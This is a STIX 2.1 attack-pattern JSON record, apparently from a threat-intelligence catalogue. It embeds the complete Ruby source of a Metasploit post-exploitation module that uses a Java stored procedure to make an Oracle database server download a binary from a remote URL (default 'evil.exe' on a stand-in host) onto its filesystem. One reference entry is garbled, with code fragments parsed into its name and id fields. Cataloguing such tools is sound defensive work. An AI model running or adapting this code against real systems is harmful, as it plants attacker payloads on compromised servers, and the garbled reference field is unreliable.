{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e3c8d275-cc5a-4335-ba8e-3eb5a2254eb6",
    "created": "2024-08-14T16:22:56.174148Z",
    "modified": "2024-08-14T16:22:56.174151Z",
    "name": "Oracle URL Download",
    "description": " This module will create a java class which enables the download of a binary from a webserver to the oracle filesystem. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/oracle/post_exploitation/win32upload.rb",
            "external_id": "win32upload.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.argeniss.com/research/oraclesqlinj.zip"
        },
        {
            "source_name": "exec=\"beginPROC_FILEUPLOAD(#{datastoreCOPYTO}",
            "external_id": "#{datastoreURL});end;\""
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::ORACLE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Oracle URL Download',\n      'Description'    => %q{\n          This module will create a java class which enables the download\n        of a binary from a webserver to the oracle filesystem.\n      },\n      'Author'         => [ 'CG' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'URL', 'http://www.argeniss.com/research/oraclesqlinj.zip' ],\n        ],\n      'DisclosureDate' => '2005-02-10'))\n\n      register_options(\n        [\n          OptString.new('URL', [ false, 'The URL to download the binary from.',  'http://www.meh.com/evil.exe']),\n          OptString.new('COPYTO', [ false, 'Location to copy the binary to',  'c:\\\\meh.exe']),\n        ])\n  end\n\n  def run\n    return if not check_dependencies\n\n    java = <<-EOF\nCREATE OR REPLACE JAVA SOURCE NAMED SRC_FILE_UPLOAD AS\nimport java.lang.*;\nimport java.io.*;\npublic class FileUpload\n{\n  public static void fileUpload(String myFile, String url) throws IOException\n  {\n    File binaryFile = new File(myFile);\n    FileOutputStream outStream = new  FileOutputStream(binaryFile);\n    java.net.URL u = new java.net.URL(url);\n    java.net.URLConnection uc = u.openConnection();\n    InputStream is = (InputStream)uc.getInputStream();\n    BufferedReader in = new BufferedReader (new InputStreamReader (is));\n    byte buffer[] = new byte[1024];\n    int length = -1;\n    while ((length = is.read(buffer)) != -1) {\n      outStream.write(buffer, 0, length);\n      outStream.flush();\n    }\n    is.close(); outStream.close();\n  }\n};;\nEOF\n\n    procedure = <<-EOF\nCREATE OR REPLACE PROCEDURE PROC_FILEUPLOAD (p_file varchar2, p_url varchar2)\nas language java\nNAME 'FileUpload.fileUpload (java.lang.String, java.lang.String)';\nEOF\n\n    exec      = \"begin PROC_FILEUPLOAD ('#{datastore['COPYTO']}', '#{datastore['URL']}'); end;\"\n\n    drops     = \"drop java source SRC_FILE_UPLOAD\"\n\n    dropp     = \"drop procedure PROC_FILEUPLOAD\"\n\n    begin\n      print_status(\"Creating java source 'SRC_FILE_UPLOAD'...\")\n      prepare_exec(java)\n    rescue => e\n      return\n    end\n\n    print_status(\"Creating procedure 'PROC_FILEUPLOAD'...\")\n    prepare_exec(procedure)\n\n    print_status(\"Trying to download binary from #{datastore['URL']} to #{datastore['COPYTO']}\")\n    prepare_exec(exec)\n\n    print_status(\"Removing java source 'SRC_FILE_UPLOAD'...\")\n    prepare_exec(drops)\n\n    print_status(\"Removing procedure 'PROC_FILEUPLOAD'...\")\n    prepare_exec(dropp)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-02-10"
}